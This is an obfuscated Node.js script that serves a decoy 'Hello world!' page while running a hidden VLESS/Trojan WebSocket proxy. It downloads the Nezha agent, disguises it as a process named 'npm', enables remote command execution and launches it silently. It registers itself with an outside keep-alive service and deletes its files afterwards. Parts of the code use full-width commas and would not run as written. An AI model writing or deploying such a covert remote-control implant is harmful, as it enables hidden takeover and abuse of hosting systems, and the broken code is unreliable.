const _0x36e331=_0x45b7;(function(_0x501fb8,_0x112b39){const _0x5cc1ca=_0x45b7,_0x31c89c=_0x501fb8();while(!![]){try{const _0x231ab1=-parseInt(_0x5cc1ca(0x10b))/0x1*(-parseInt(_0x5cc1ca(0xf5))/0x2)+-parseInt(_0x5cc1ca(0x146))/0x3+parseInt(_0x5cc1ca(0x119))/0x4*(-parseInt(_0x5cc1ca(0x13a))/0x5)+-parseInt(_0x5cc1ca(0xe4))/0x6+parseInt(_0x5cc1ca(0x142))/0x7+parseInt(_0x5cc1ca(0x128))/0x8*(parseInt(_0x5cc1ca(0x123))/0x9)+parseInt(_0x5cc1ca(0x11a))/0xa;if(_0x231ab1===_0x112b39)break;else _0x31c89c['push'](_0x31c89c['shift']());}catch(_0x57311f){_0x31c89c['push'](_0x31c89c['shift']());}}}(_0x2a16,0xd721f));const _0x5b5461=(function(){let _0x4b0fec=!![];return function(_0x22836c,_0x2a62df){const _0x2e9ab9=_0x4b0fec?function(){const _0x258748=_0x45b7;if(_0x2a62df){const _0x47d645=_0x2a62df[_0x258748(0x14c)](_0x22836c,arguments);return _0x2a62df=null,_0x47d645;}}:function(){};return _0x4b0fec=![],_0x2e9ab9;};}()),_0x74fea8=_0x5b5461(this,function(){const _0x473095=_0x45b7;return _0x74fea8['toString']()[_0x473095(0x179)](_0x473095(0x15a))['toString']()['constructor'](_0x74fea8)[_0x473095(0x179)](_0x473095(0x15a));});_0x74fea8();const _0x3da1a6=(function(){let _0x49a7c4=!![];return function(_0x4a5145,_0x1b5d1a){const _0x497f85=_0x49a7c4?function(){const _0x269e28=_0x45b7;if(_0x1b5d1a){const _0x249e65=_0x1b5d1a[_0x269e28(0x14c)](_0x4a5145,arguments);return _0x1b5d1a=null,_0x249e65;}}:function(){};return _0x49a7c4=![],_0x497f85;};}()),_0x52aaa3=_0x3da1a6(this,function(){const _0x1ca63d=_0x45b7;let _0x248885;try{const _0x1eb2ee=Function(_0x1ca63d(0x152)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x248885=_0x1eb2ee();}catch(_0x4066d3){_0x248885=window;}const _0x28f774=_0x248885[_0x1ca63d(0x156)]=_0x248885['console']||{},_0x589c90=['log',_0x1ca63d(0x100),_0x1ca63d(0xda),_0x1ca63d(0xea),_0x1ca63d(0xdd),_0x1ca63d(0x158),_0x1ca63d(0xfb)];for(let _0x5d0826=0x0;_0x5d0826<_0x589c90[_0x1ca63d(0x11e)];_0x5d0826++){const _0x2e9055=_0x3da1a6[_0x1ca63d(0x121)][_0x1ca63d(0x148)][_0x1ca63d(0x17e)](_0x3da1a6),_0x5bb401=_0x589c90[_0x5d0826],_0x26ea04=_0x28f774[_0x5bb401]||_0x2e9055;_0x2e9055[_0x1ca63d(0x15e)]=_0x3da1a6[_0x1ca63d(0x17e)](_0x3da1a6),_0x2e9055['toString']=_0x26ea04[_0x1ca63d(0xec)][_0x1ca63d(0x17e)](_0x26ea04),_0x28f774[_0x5bb401]=_0x2e9055;}});_0x52aaa3();const os=require('os'),http=require(_0x36e331(0x13e)),fs=require('fs'),axios=require(_0x36e331(0x122)),net=require(_0x36e331(0x117)),path=require('path'),crypto=require(_0x36e331(0x12b)),{Buffer}=require(_0x36e331(0xe6)),{exec,execSync}=require(_0x36e331(0x159)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x36e331(0x138)][_0x36e331(0x105)]||'1b2021de-9b60-46a6-99f9-e372e29b3cd4',NEZHA_SERVER=process[_0x36e331(0x138)][_0x36e331(0x147)]||_0x36e331(0xeb),NEZHA_PORT=process[_0x36e331(0x138)][_0x36e331(0xfd)]||'',NEZHA_KEY=process[_0x36e331(0x138)][_0x36e331(0x165)]||'123qweasdzxc',DOMAIN=process[_0x36e331(0x138)][_0x36e331(0x168)]||_0x36e331(0xd9),AUTO_ACCESS=process[_0x36e331(0x138)][_0x36e331(0xfe)]?process[_0x36e331(0x138)][_0x36e331(0xfe)]['toLowerCase']()==='true':!![],WSPATH=process[_0x36e331(0x138)][_0x36e331(0xdf)]||UUID[_0x36e331(0x17b)](0x0,0x8),SUB_PATH=process['env'][_0x36e331(0x113)]||_0x36e331(0x131),NAME=process[_0x36e331(0x138)][_0x36e331(0xf6)]||_0x36e331(0xd7),PORT=process[_0x36e331(0x138)]['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x395281=_0x36e331;try{const _0x46221f=await axios[_0x395281(0x10d)](_0x395281(0xf4)),_0x4237ec=_0x46221f[_0x395281(0xe8)];ISP=(_0x4237ec[_0x395281(0x14e)]+'-'+_0x4237ec[_0x395281(0x10f)])[_0x395281(0x114)](/ /g,'_');}catch(_0x2bd8a6){ISP=_0x395281(0xe5);}};GetISP();const httpServer=http[_0x36e331(0x150)]((_0x57b2bf,_0x4b99fe)=>{const _0x3cda48=_0x36e331;if(_0x57b2bf['url']==='/'){const _0x539696=path[_0x3cda48(0x153)](__dirname,_0x3cda48(0x11c));fs['readFile'](_0x539696,'utf8',(_0xd23770,_0x1b8a1f)=>{const _0x54fa27=_0x3cda48;if(_0xd23770){const _0x51567a={};_0x51567a[_0x54fa27(0x143)]='text/html',_0x4b99fe[_0x54fa27(0x13b)](0xc8,_0x51567a),_0x4b99fe[_0x54fa27(0x16b)](_0x54fa27(0x161));return;}const _0x436b83={};_0x436b83[_0x54fa27(0x143)]=_0x54fa27(0xf7),_0x4b99fe[_0x54fa27(0x13b)](0xc8,_0x436b83),_0x4b99fe[_0x54fa27(0x16b)](_0x1b8a1f);});return;}else{if(_0x57b2bf[_0x3cda48(0x171)]==='/'+SUB_PATH){const _0x20719b=_0x3cda48(0xf8)+UUID+'@'+DOMAIN+_0x3cda48(0xf0)+DOMAIN+_0x3cda48(0x176)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x147a48=_0x3cda48(0x16f)+UUID+'@'+DOMAIN+_0x3cda48(0x106)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x3cda48(0x175)+WSPATH+'#'+NAME+'-'+ISP,_0x5adb69=_0x20719b+'\x0a'+_0x147a48,_0x293008=Buffer[_0x3cda48(0x163)](_0x5adb69)[_0x3cda48(0xec)]('base64'),_0x15dee6={};_0x15dee6[_0x3cda48(0x143)]=_0x3cda48(0xd8),_0x4b99fe['writeHead'](0xc8,_0x15dee6),_0x4b99fe[_0x3cda48(0x16b)](_0x293008+'\x0a');}else{const _0x3b143a={};_0x3b143a['Content-Type']=_0x3cda48(0xd8),_0x4b99fe['writeHead'](0x194,_0x3b143a),_0x4b99fe[_0x3cda48(0x16b)]('Not\x20Found\x0a');}}}),_0x40aefd={};function _0x45b7(_0x3c440e,_0xc25eea){const _0x4ce5e0=_0x2a16();return _0x45b7=function(_0x52aaa3,_0x3da1a6){_0x52aaa3=_0x52aaa3-0xd3;let _0x26e596=_0x4ce5e0[_0x52aaa3];return _0x26e596;},_0x45b7(_0x3c440e,_0xc25eea);}_0x40aefd[_0x36e331(0x124)]=httpServer;const wss=new WebSocket['Server'](_0x40aefd),uuid=UUID[_0x36e331(0x114)](/-/g,''),DNS_SERVERS=[_0x36e331(0x174),_0x36e331(0x10c)];function resolveHost(_0xfb2cf4){return new Promise((_0x643936,_0x45a93b)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0xfb2cf4)){_0x643936(_0xfb2cf4);return;}let _0x57ddf1=0x0;function _0x5e4b32(){const _0x306582=_0x45b7;if(_0x57ddf1>=DNS_SERVERS['length']){_0x45a93b(new Error(_0x306582(0xdc)+_0xfb2cf4+_0x306582(0x162)));return;}const _0x48d842=DNS_SERVERS[_0x57ddf1];_0x57ddf1++;const _0x4e7786=_0x306582(0x15b)+encodeURIComponent(_0xfb2cf4)+_0x306582(0xdb),_0x3bd26b={};_0x3bd26b[_0x306582(0x15d)]=_0x306582(0x144);const _0x46ca6c={};_0x46ca6c['timeout']=0x1388,_0x46ca6c[_0x306582(0x14b)]=_0x3bd26b,axios['get'](_0x4e7786,_0x46ca6c)[_0x306582(0x141)](_0x5212aa=>{const _0x7f6e3=_0x306582,_0x30406b=_0x5212aa[_0x7f6e3(0xe8)];if(_0x30406b[_0x7f6e3(0x11b)]===0x0&&_0x30406b[_0x7f6e3(0x12e)]&&_0x30406b[_0x7f6e3(0x12e)][_0x7f6e3(0x11e)]>0x0){const _0x216bd8=_0x30406b[_0x7f6e3(0x12e)]['find'](_0x422370=>_0x422370[_0x7f6e3(0x112)]===0x1);if(_0x216bd8){_0x643936(_0x216bd8[_0x7f6e3(0xe8)]);return;}}_0x5e4b32();})[_0x306582(0x157)](_0x3a90c1=>{const _0x1dd499=_0x306582;console[_0x1dd499(0xf1)](_0x1dd499(0x134)+_0x48d842+']\x20->\x20'+_0xfb2cf4+':',_0x3a90c1[_0x1dd499(0x132)]),_0x5e4b32();});}_0x5e4b32();});}function handleVlessConnection(_0x171eb8,_0x27ef9c){const _0x152bf2=_0x36e331,[_0x1f5368]=_0x27ef9c,_0x1bbe64=_0x27ef9c[_0x152bf2(0x17b)](0x1,0x11);if(!_0x1bbe64['every']((_0x5da373,_0x35780f)=>_0x5da373==parseInt(uuid['substr'](_0x35780f*0x2,0x2),0x10)))return![];let _0x37e879=_0x27ef9c['slice'](0x11,0x12)[_0x152bf2(0x11d)]()+0x13;const _0x1c1549=_0x27ef9c['slice'](_0x37e879,_0x37e879+=0x2)['readUInt16BE'](0x0),_0x5201e7=_0x27ef9c[_0x152bf2(0x17b)](_0x37e879,_0x37e879+=0x1)[_0x152bf2(0x11d)](),_0x4a94ea=_0x5201e7==0x1?_0x27ef9c['slice'](_0x37e879,_0x37e879+=0x4)['join']('.'):_0x5201e7==0x2?new TextDecoder()[_0x152bf2(0x107)](_0x27ef9c[_0x152bf2(0x17b)](_0x37e879+0x1,_0x37e879+=0x1+_0x27ef9c[_0x152bf2(0x17b)](_0x37e879,_0x37e879+0x1)[_0x152bf2(0x11d)]())):_0x5201e7==0x3?_0x27ef9c[_0x152bf2(0x17b)](_0x37e879,_0x37e879+=0x10)[_0x152bf2(0xe3)]((_0x17dc73,_0x1904fa,_0x385b50,_0x4f3b02)=>_0x385b50%0x2?_0x17dc73[_0x152bf2(0x17f)](_0x4f3b02[_0x152bf2(0x17b)](_0x385b50-0x1,_0x385b50+0x1)):_0x17dc73,[])[_0x152bf2(0x12d)](_0x1143ce=>_0x1143ce[_0x152bf2(0xe7)](0x0)[_0x152bf2(0xec)](0x10))[_0x152bf2(0x153)](':'):'';_0x171eb8[_0x152bf2(0x133)](new Uint8Array([_0x1f5368,0x0]));const _0x581610=createWebSocketStream(_0x171eb8);return resolveHost(_0x4a94ea)[_0x152bf2(0x141)](_0xe9a5bd=>{const _0x2f8417=_0x152bf2,_0x14f6cc={};_0x14f6cc[_0x2f8417(0x120)]=_0xe9a5bd,_0x14f6cc[_0x2f8417(0x140)]=_0x1c1549,net[_0x2f8417(0x129)](_0x14f6cc,function(){const _0x51aa2c=_0x2f8417;this['write'](_0x27ef9c[_0x51aa2c(0x17b)](_0x37e879)),_0x581610['on']('error',_0x54ef53=>console[_0x51aa2c(0xf1)](_0x51aa2c(0x172),_0x54ef53[_0x51aa2c(0x132)]))['pipe'](this)['on'](_0x51aa2c(0xea),_0xf59f7e=>console[_0x51aa2c(0xf1)](_0x51aa2c(0xe9),_0xf59f7e['message']))['pipe'](_0x581610);})['on'](_0x2f8417(0xea),_0x37fc98=>console[_0x2f8417(0xf1)]('VLESS连接失败:',_0x37fc98['message']));})['catch'](_0x3e0f17=>{const _0x21c816=_0x152bf2;console[_0x21c816(0xf1)](_0x21c816(0x103),_0x3e0f17[_0x21c816(0x132)]);const _0x545ed6={};_0x545ed6[_0x21c816(0x120)]=_0x4a94ea,_0x545ed6['port']=_0x1c1549,net[_0x21c816(0x129)](_0x545ed6,function(){const _0x3d0280=_0x21c816;this['write'](_0x27ef9c[_0x3d0280(0x17b)](_0x37e879)),_0x581610['on'](_0x3d0280(0xea),_0x367742=>console[_0x3d0280(0xf1)](_0x3d0280(0x172),_0x367742[_0x3d0280(0x132)]))[_0x3d0280(0xd3)](this)['on'](_0x3d0280(0xea),_0x1946e3=>console[_0x3d0280(0xf1)]('VLESS目标连接错误:',_0x1946e3[_0x3d0280(0x132)]))['pipe'](_0x581610);})['on']('error',_0x325d14=>console[_0x21c816(0xf1)](_0x21c816(0xf3),_0x325d14[_0x21c816(0x132)]));}),!![];}function handleTrojanConnection(_0x8825c4,_0x2e5613){const _0x3e2e6a=_0x36e331;try{if(_0x2e5613[_0x3e2e6a(0x11e)]<0x3a)return![];const _0xb8d345=_0x2e5613[_0x3e2e6a(0x17b)](0x0,0x38)[_0x3e2e6a(0xec)](),_0x1c6acf=[UUID];let _0x4043a5=null;for(const _0x1ae154 of _0x1c6acf){const _0x3bc5ae=crypto[_0x3e2e6a(0xf2)]('sha224')[_0x3e2e6a(0x149)](_0x1ae154)['digest']('hex');if(_0x3bc5ae===_0xb8d345){_0x4043a5=_0x1ae154;break;}}if(!_0x4043a5)return![];let _0x10a4de=0x38;_0x2e5613[_0x10a4de]===0xd&&_0x2e5613[_0x10a4de+0x1]===0xa&&(_0x10a4de+=0x2);const _0x19822a=_0x2e5613[_0x10a4de];if(_0x19822a!==0x1)return![];_0x10a4de+=0x1;const _0x273c71=_0x2e5613[_0x10a4de];_0x10a4de+=0x1;let _0x22446e,_0x37aeb0;if(_0x273c71===0x1)_0x22446e=_0x2e5613[_0x3e2e6a(0x17b)](_0x10a4de,_0x10a4de+0x4)[_0x3e2e6a(0x153)]('.'),_0x10a4de+=0x4;else{if(_0x273c71===0x3){const _0x1f7539=_0x2e5613[_0x10a4de];_0x10a4de+=0x1,_0x22446e=_0x2e5613[_0x3e2e6a(0x17b)](_0x10a4de,_0x10a4de+_0x1f7539)['toString'](),_0x10a4de+=_0x1f7539;}else{if(_0x273c71===0x4)_0x22446e=_0x2e5613['slice'](_0x10a4de,_0x10a4de+0x10)[_0x3e2e6a(0xe3)]((_0x52fa1b,_0xa5f3f5,_0x358d8a,_0x5d6f41)=>_0x358d8a%0x2?_0x52fa1b[_0x3e2e6a(0x17f)](_0x5d6f41[_0x3e2e6a(0x17b)](_0x358d8a-0x1,_0x358d8a+0x1)):_0x52fa1b,[])[_0x3e2e6a(0x12d)](_0x332905=>_0x332905[_0x3e2e6a(0xe7)](0x0)[_0x3e2e6a(0xec)](0x10))[_0x3e2e6a(0x153)](':'),_0x10a4de+=0x10;else return![];}}_0x37aeb0=_0x2e5613['readUInt16BE'](_0x10a4de),_0x10a4de+=0x2;_0x10a4de<_0x2e5613[_0x3e2e6a(0x11e)]&&_0x2e5613[_0x10a4de]===0xd&&_0x2e5613[_0x10a4de+0x1]===0xa&&(_0x10a4de+=0x2);const _0x24aee4=createWebSocketStream(_0x8825c4);return resolveHost(_0x22446e)[_0x3e2e6a(0x141)](_0x46ed1a=>{const _0xf21ba6=_0x3e2e6a,_0x19ebd7={};_0x19ebd7['host']=_0x46ed1a,_0x19ebd7[_0xf21ba6(0x140)]=_0x37aeb0,net['connect'](_0x19ebd7,function(){const _0x279914=_0xf21ba6;_0x10a4de<_0x2e5613[_0x279914(0x11e)]&&this['write'](_0x2e5613[_0x279914(0x17b)](_0x10a4de)),_0x24aee4['on']('error',_0x2740f2=>console['log'](_0x279914(0x136),_0x2740f2[_0x279914(0x132)]))['pipe'](this)['on'](_0x279914(0xea),_0x6517f0=>console[_0x279914(0xf1)](_0x279914(0x12a),_0x6517f0[_0x279914(0x132)]))[_0x279914(0xd3)](_0x24aee4);})['on'](_0xf21ba6(0xea),_0x4239f3=>console[_0xf21ba6(0xf1)](_0xf21ba6(0xff),_0x4239f3[_0xf21ba6(0x132)]));})['catch'](_0x1a77f3=>{const _0x493e5f=_0x3e2e6a;console[_0x493e5f(0xf1)](_0x493e5f(0x103),_0x1a77f3[_0x493e5f(0x132)]);const _0x25571a={};_0x25571a[_0x493e5f(0x120)]=_0x22446e,_0x25571a[_0x493e5f(0x140)]=_0x37aeb0,net['connect'](_0x25571a,function(){const _0x379d5a=_0x493e5f;_0x10a4de<_0x2e5613[_0x379d5a(0x11e)]&&this[_0x379d5a(0x125)](_0x2e5613[_0x379d5a(0x17b)](_0x10a4de)),_0x24aee4['on'](_0x379d5a(0xea),_0x392032=>console[_0x379d5a(0xf1)](_0x379d5a(0x136),_0x392032[_0x379d5a(0x132)]))['pipe'](this)['on'](_0x379d5a(0xea),_0x4b0642=>console[_0x379d5a(0xf1)](_0x379d5a(0x12a),_0x4b0642[_0x379d5a(0x132)]))['pipe'](_0x24aee4);})['on'](_0x493e5f(0xea),_0x489a90=>console[_0x493e5f(0xf1)](_0x493e5f(0x110),_0x489a90[_0x493e5f(0x132)]));}),!![];}catch(_0x1a3984){return console[_0x3e2e6a(0xf1)](_0x3e2e6a(0xfa),_0x1a3984[_0x3e2e6a(0x132)]),![];}}wss['on'](_0x36e331(0x14a),(_0x3d89c3,_0xc8c8)=>{const _0x43bab8=_0x36e331,_0x25fc7b=_0xc8c8[_0x43bab8(0x171)]||'';_0x3d89c3['once']('message',_0x498952=>{const _0x290138=_0x43bab8;if(_0x498952[_0x290138(0x11e)]>0x11&&_0x498952[0x0]===0x0){const _0x55f334=_0x498952['slice'](0x1,0x11),_0x3b9436=_0x55f334[_0x290138(0x111)]((_0x164b9d,_0x63c2ae)=>_0x164b9d==parseInt(uuid[_0x290138(0x177)](_0x63c2ae*0x2,0x2),0x10));if(_0x3b9436){!handleVlessConnection(_0x3d89c3,_0x498952)&&_0x3d89c3['close']();return;}}!handleTrojanConnection(_0x3d89c3,_0x498952)&&_0x3d89c3[_0x290138(0xee)]();})['on'](_0x43bab8(0xea),_0xd97f66=>{const _0x3f5835=_0x43bab8;console[_0x3f5835(0xf1)](_0x3f5835(0x12f),_0xd97f66[_0x3f5835(0x132)]);});});function _0x2a16(){const _0x153cc0=['join','2096','文件写入失败:','console','catch','table','child_process','(((.+)+)+)+$','https://dns.google/resolve?name=','chmod\x20+x\x20npm','Accept','__proto__','/bin/bash','赋予执行权限失败:','Hello\x20world!','\x20with\x20all\x20DNS\x20servers','from','npm\x20running\x20error:','NEZHA_KEY','\x20-p\x20','client_secret:\x20','DOMAIN','writeFileSync','linux-amd64','end','post','下载哪吒客户端失败:','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','trojan://','encoding','url','VLESS连接错误:','npm\x20is\x20running','8.8.4.4','&path=%2F','&fp=chrome&type=ws&host=','substr','exit','search','includes','slice','服务启动失败:','npm','bind','concat','npm\x20download\x20successfully','error:\x20','2087','https://oooo.serv00.net/add-url','pipe','2053','8443','application/json','Hug_ws','text/plain','your.domain.com','info','&type=A','Failed\x20to\x20resolve\x20','exception','timeout','WSPATH','pop','split','2083','reduce','9403308toARvd','Unknown','buffer','readUInt16BE','data','VLESS目标连接错误:','error','gnezha.gcc.qzz.io:8008','toString','trim','close','createWriteStream',':443?encryption=none&security=tls&sni=','log','createHash','VLESS直接连接失败:','https://speed.cloudflare.com/meta','1938868clbMSU','NAME','text/html','vless://','false','Trojan连接处理异常:','trace','shell','NEZHA_PORT','AUTO_ACCESS','Trojan连接失败:','warn','arch','https://github.com/naiba/nezha/releases/latest/download/nezha-agent-','DNS解析失败，尝试直接连接:','https://','UUID',':443?security=tls&sni=','decode','stream','自动保活功能已开启，但未配置DOMAIN，跳过任务添加','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','1YiRNrK','1.1.1.1','get','npm\x20is\x20already\x20running,\x20skip\x20running...','asOrganization','Trojan直接连接失败:','every','type','SUB_PATH','replace','arm64','nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','net','ignore','228NoQUcX','11017590MHgzeB','Status','index.html','readUInt8','length','aarch64','host','constructor','axios','4095414vrihtJ','server','write','config.yaml','unlink','8HOeaYv','connect','Trojan目标连接错误:','crypto','linux-arm64','map','Answer','WebSocket连接异常:','responseType','sub2','message','send','DNS查询失败\x20[','arm','Trojan连接错误:','linux-arm','env','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','31455WgLQBx','writeHead','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','--tls','http','method','port','then','7528255ZySgXx','Content-Type','application/dns-json','stdio','2384148AgCDMI','NEZHA_SERVER','prototype','update','connection','headers','apply','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','country','Server\x20is\x20running\x20on\x20port\x20','createServer','正在下载哪吒客户端:\x20','return\x20(function()\x20'];_0x2a16=function(){return _0x153cc0;};return _0x2a16();}const getDownloadUrl=()=>{const _0x1da13f=_0x36e331,_0x2a111a=os[_0x1da13f(0x101)](),_0x4243d1=_0x1da13f(0x102);return _0x2a111a===_0x1da13f(0x135)||_0x2a111a===_0x1da13f(0x115)||_0x2a111a===_0x1da13f(0x11f)?_0x2a111a===_0x1da13f(0x135)?_0x4243d1+_0x1da13f(0x137):_0x4243d1+_0x1da13f(0x12c):_0x4243d1+_0x1da13f(0x16a);},downloadFile=async()=>{const _0xa57cfc=_0x36e331;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x32339a=getDownloadUrl();console['log'](_0xa57cfc(0x151)+_0x32339a);const _0x33bf74={};_0x33bf74[_0xa57cfc(0x13f)]=_0xa57cfc(0x10d),_0x33bf74[_0xa57cfc(0x171)]=_0x32339a,_0x33bf74[_0xa57cfc(0x130)]=_0xa57cfc(0x108),_0x33bf74[_0xa57cfc(0xde)]=0x7530;const _0x35107b=await axios(_0x33bf74),_0x11c40f=fs[_0xa57cfc(0xef)](_0xa57cfc(0x17d));return _0x35107b[_0xa57cfc(0xe8)][_0xa57cfc(0xd3)](_0x11c40f),new Promise((_0x3853dc,_0x30ad5d)=>{const _0x4d1920=_0xa57cfc;_0x11c40f['on']('finish',()=>{const _0x2988ab=_0x45b7;console[_0x2988ab(0xf1)](_0x2988ab(0x180)),exec(_0x2988ab(0x15c),_0x490a0b=>{const _0xd9a4b6=_0x2988ab;_0x490a0b&&(console['error'](_0xd9a4b6(0x160),_0x490a0b[_0xd9a4b6(0x132)]),_0x30ad5d(_0x490a0b)),_0x3853dc();});}),_0x11c40f['on'](_0x4d1920(0xea),_0x1a16b0=>{const _0x590057=_0x4d1920;console['error'](_0x590057(0x155),_0x1a16b0[_0x590057(0x132)]),_0x30ad5d(_0x1a16b0);});});}catch(_0x47bd15){console[_0xa57cfc(0xea)](_0xa57cfc(0x16d),_0x47bd15[_0xa57cfc(0x132)]);throw _0x47bd15;}},runnz=async()=>{const _0x301476=_0x36e331;try{const _0x38299d={};_0x38299d[_0x301476(0x170)]='utf-8',_0x38299d[_0x301476(0x145)]=_0x301476(0x118);const _0x7e2cc2=execSync(_0x301476(0x16e),_0x38299d);if(_0x7e2cc2[_0x301476(0xed)]()!==''){console[_0x301476(0xf1)](_0x301476(0x10e));return;}}catch(_0x5eaeae){}try{await downloadFile();let _0x5a6aa1='',_0x2a66a1=['443',_0x301476(0xd5),_0x301476(0x154),_0x301476(0x182),_0x301476(0xe2),_0x301476(0xd4)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x26fbb8=_0x2a66a1[_0x301476(0x17a)](NEZHA_PORT)?_0x301476(0x13d):'';_0x5a6aa1='nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x301476(0x166)+NEZHA_KEY+'\x20'+_0x26fbb8+_0x301476(0x139);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x45f734=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x301476(0xe1)](':')[_0x301476(0xe0)]():''，_0x33ade8=_0x2a66a1['includes'](_0x45f734)?'true':_0x301476(0xf9)，_0xaaf672=_0x301476(0x167)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x301476(0x13c)+_0x33ade8+_0x301476(0x14d)+UUID;fs[_0x301476(0x169)](_0x301476(0x126)，_0xaaf672);}_0x5a6aa1=_0x301476(0x116);}else{console[_0x301476(0xf1)](_0x301476(0x10a));return;}}const _0x307991={};_0x307991[_0x301476(0xfc)]=_0x301476(0x15f)，exec(_0x5a6aa1，_0x307991，_0x1c925d=>{const _0x5643bb=_0x301476;if(_0x1c925d)console[_0x5643bb(0xea)](_0x5643bb(0x164)，_0x1c925d);else console[_0x5643bb(0xf1)](_0x5643bb(0x173));});}catch(_0x4122d5){console[_0x301476(0xea)](_0x301476(0x181)+_0x4122d5);}};async function addAccessTask(){const _0x44ec26=_0x36e331;if(!AUTO_ACCESS)return;if(!DOMAIN){console[_0x44ec26(0xf1)](_0x44ec26(0x109));return;}const _0x3f902d=_0x44ec26(0x104)+DOMAIN+'/'+SUB_PATH;try{const _0x2f23d7={};_0x2f23d7[_0x44ec26(0x171)]=_0x3f902d;const _0xc54e1={};_0xc54e1[_0x44ec26(0x143)]=_0x44ec26(0xd6);const _0x5d0ed8={};_0x5d0ed8[_0x44ec26(0x14b)]=_0xc54e1，_0x5d0ed8['timeout']=0x2710;const _0x3cfc0a=await axios[_0x44ec26(0x16c)](_0x44ec26(0x183)，_0x2f23d7，_0x5d0ed8);console[_0x44ec26(0xf1)]('Automatic\x20Access\x20任务\x20added\x20successfully');}catch(_0x2fc09b){}}const delFiles=()=>{const _0x188d79=_0x36e331;fs['unlink'](_0x188d79(0x17d)，()=>{})，fs[_0x188d79(0x127)](_0x188d79(0x126)，()=>{});};httpServer['listen'](PORT，()=>{const _0x46f793=_0x36e331;runnz()，setTimeout(()=>{delFiles();}，0x2bf20)，addAccessTask()，console[_0x46f793(0xf1)](_0x46f793(0x14f)+PORT);})['on'](_0x36e331(0xea)，_0x1d7781=>{const _0x300f87=_0x36e331;console[_0x300f87(0xea)](_0x300f87(0x17c)，_0x1d7781[_0x300f87(0x132)])，process[_0x300f87(0x178)](0x1);});
